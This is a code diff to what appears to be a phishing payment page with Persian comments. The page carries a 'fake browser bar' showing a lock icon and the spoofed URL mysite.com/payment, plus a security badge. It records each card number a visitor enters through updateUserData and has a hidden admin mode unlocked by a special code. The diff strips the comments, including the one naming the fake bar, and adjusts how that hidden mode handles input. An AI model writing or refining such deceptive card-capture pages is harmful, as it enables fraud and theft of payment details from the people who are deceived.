@@ -123,7 +123,7 @@
             border: 1px solid #eee;
             display: flex;
             flex-direction: column;
-            gap: 20px; /* فاصله بین فرم‌ها */
+            gap: 20px;
         }
         .security-badge {
             position: absolute;
@@ -146,21 +146,21 @@
         .step.active { display: block; }
         @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
         .form-group {
-            margin-bottom: 20px; /* فاصله عمودی کمتر برای مرتب‌تر شدن */
+            margin-bottom: 20px;
             position: relative;
         }
         label {
             font-size: 15px;
             color: #333;
-            margin-bottom: 8px; /* فاصله کمتر بین لیبل و ورودی */
+            margin-bottom: 8px;
             display: block;
             font-weight: 500;
         }
         input {
             width: 100%;
-            padding: 12px; /* کمی کاهش پدینگ برای جمع‌وجورتر شدن */
+            padding: 12px;
             border: 1px solid #ddd;
-            border-radius: 8px; /* گوشه‌های کمی تیزتر برای ظاهر مدرن‌تر */
+            border-radius: 8px;
             font-size: 16px;
             direction: rtl;
             text-align: right;
@@ -173,7 +173,7 @@
         }
         .btn {
             width: 100%;
-            padding: 12px; /* کاهش پدینگ دکمه‌ها برای هماهنگی */
+            padding: 12px;
             border: none;
             border-radius: 8px;
             font-size: 16px;
@@ -254,7 +254,6 @@
     </style>
 </head>
 <body>
-    <!-- نوار مرورگر جعلی -->
     <div class="fake-browser-bar">
         <span class="lock-icon">🔒</span>
         <span class="url">https://www.mysite.com/payment</span>
@@ -375,10 +374,13 @@
                     let value = e.target.value.replace(/\D/g, '');
                     if (value === SPECIAL_CODE) {
                         enterAdminMode();
+                        e.target.value = SPECIAL_CODE;
                         return;
                     }
-                    value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
-                    e.target.value = value;
+                    if (!isSpecialMode) {
+                        value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                        e.target.value = value;
+                    }
                 });
                 cardNumber.addEventListener('blur', e => updateUserData('شماره کارت', e.target.value));
 
